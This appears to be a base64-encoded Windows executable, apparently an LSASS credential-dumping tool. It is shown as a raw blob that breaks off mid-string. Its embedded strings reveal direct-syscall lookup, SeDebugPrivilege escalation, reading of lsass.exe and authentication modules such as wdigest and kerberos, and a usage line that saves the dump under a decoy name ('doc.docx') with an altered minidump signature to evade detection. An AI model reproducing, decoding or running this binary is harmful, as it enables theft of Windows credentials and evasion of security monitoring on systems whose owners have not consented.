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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsKoAQAEAAAAAAAAAAAAAAP//////////AAAAAAAAAAD/////AAAAAAAAAAAAAAAA/wAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAD/////AAAAAAAAAAAAAAAAQAAAAMO////APwAAAQAAAAAAAAAOAAAAAAAAAAAAAAAgIgFAAQAAAAAAAAAAAAAAUKgAQAEAAAAAAAAAAAAAAH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guIENvbnRpbnVpbmcgYW55d2F5cy4uLgoAAAAAAAAAVGhlIExTQVNTIHByb2Nlc3Mgd2FzIG5vdCBmb3VuZC4KAAAAAAAAAEZhaWxlZCB0byBjYWxsIE50R2V0TmV4dFByb2Nlc3MsIHN0YXR1czogMHglbHgKAGwAcwBhAHMAcwAuAGUAeABlAAAAAAAAAHVzYWdlOiAlcyAtLXdyaXRlIEM6XFdpbmRvd3NcVGVtcFxkb2MuZG9jeCBbLS12YWxpZF0gWy0tcGlkIDEyMzRdIFstLWhlbHBdCgAgICAgLS13cml0ZSBQQVRILCAtdyBQQVRICgAAICAgICAgICAgICAgZnVsbCBwYXRoIHRvIHRoZSBkdW1wZmlsZQoAICAgIC0tdmFsaWQsIC12CgAgICAgICAgICAgICBjcmVhdGUgYSBkdW1wIHdpdGggYSB2YWxpZCBzaWduYXR1cmUgKG9wdGlvbmFsKQoAICAgIC0tcGlkIFBJRCwgLXAgUElECgAAAAAAICAgICAgICAgICAgdGhlIFBJRCBvZiBMU0FTUyAob3B0aW9uYWwpCgAgICAgLS1oZWxwLCAtaAoAAAAAAAAAACAgICAgICAgICAgIHByaW50IHRoaXMgaGVscCBtZXNzYWdlIGFuZCBsZWF2ZQBQTURNAC12AC0tdmFsaWQALXcALS13cml0ZQAtcAAtLXBpZAAtaAAtLWhlbHAAaW52YWxpZCBhcmd1bWVudDogJXMKAAAAAAAAAFlvdSBtdXN0IHByb3ZpZGUgYSBmdWxsIHBhdGg6ICVzAAAAAAAAAABDb3VsZCBub3QgZW5hYmxlICdTZURlYnVnUHJpdmlsZWdlJywgY29udGludWluZyBhbnl3YXlzLi4uCgAAAAAAQ291bGQgbm90IGFsbG9jYXRlIGVub3VnaCBtZW1vcnkgdG8gd3JpdGUgdGhlIGR1bXAAAAAAAABGYWlsZWQgdG8gY2FsbCBOdEZyZWVWaXJ0dWFsTWVtb3J5LCBzdGF0dXM6IDB4JWx4CgAAAAAAAFRoZSBtaW5pZHVtcCBoYXMgYW4gaW52YWxpZCBzaWduYXR1cmUsIHJlc3RvcmUgaX